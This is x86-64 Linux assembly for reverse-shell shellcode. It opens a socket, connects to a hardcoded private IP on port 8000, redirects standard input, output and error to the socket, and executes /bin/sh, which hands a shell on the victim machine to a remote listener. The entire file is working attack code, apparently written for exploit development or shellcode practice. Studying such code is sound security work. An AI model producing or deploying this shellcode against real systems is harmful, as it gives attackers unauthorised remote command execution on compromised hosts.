section .text

global _start
_start:

;socket
xor rax, rax
xor rdi, rdi
xor rsi, rsi
xor rdx, rdx

; Create Sokcet int socket(int domain, int type, int protocol);
mov al, 41 ;__NR_socket
mov dil, 2 ; int domain
mov sil, 1 ; int type
syscall

push rax ;push the file descriptor

;Connect Call  int connect(int sockfd, const struct sockaddr *addr,socklen_t addrlen);
xor rax, rax
xor rsi, rsi
xor rdi, rdi
xor rdx, rdx ;xor last argument

pop rdi ;pop it

mov rbx, 0xCF01A8C0401F0002 ; push <IP> 8000 AF_INET YOU MAY NEED TO MAKE BIT OPERATIONS HERE IN ORDER TO MAKE THIS PROPER SHELLCODE
push rbx

mov al, 42 ;connect syscall
mov dl, 16 ; addrlen
mov rsi, rsp
syscall


;dup2
xor r12, r12 ;Initiate register to 0
mov BYTE r12b, 0x2 ;Give the first value of stderr

dup2:
xor rax, rax
xor rsi, rsi

mov al, 33 
mov sil, r12b ;mov the newfd in the sil
syscall

dec r12b ;dec the fd
cmp BYTE r12b, 0x0 ;compare
jge dup2 ;jump if the fd is greater or equal to 0


;Time for Shell
xor rax, rax                ;set rax to 0
push rax                    ;push the 0 for the end of the string
mov rax, 0x68732f2f6e69622f ;mov the string /bin//sh to the rax register
push rax                    ;push the string into stack

mov rdi, rsp                ; RDI now points directly to "/bin//sh" on the stack

xor rax, rax        
push rax                    ; Push another 0 to terminate the argv array
push rdi                    ; Push the pointer to "/bin//sh" (this is argv[0])

;execve syscall
mov al, 59
mov rsi, rsp                ;Look to the pointer that points the string this is argv
xor rdx, rdx                ;exit code
syscall


;exit syscall
xor rax, rax                
mov al, 60                  
xor rdi, rdi
syscall
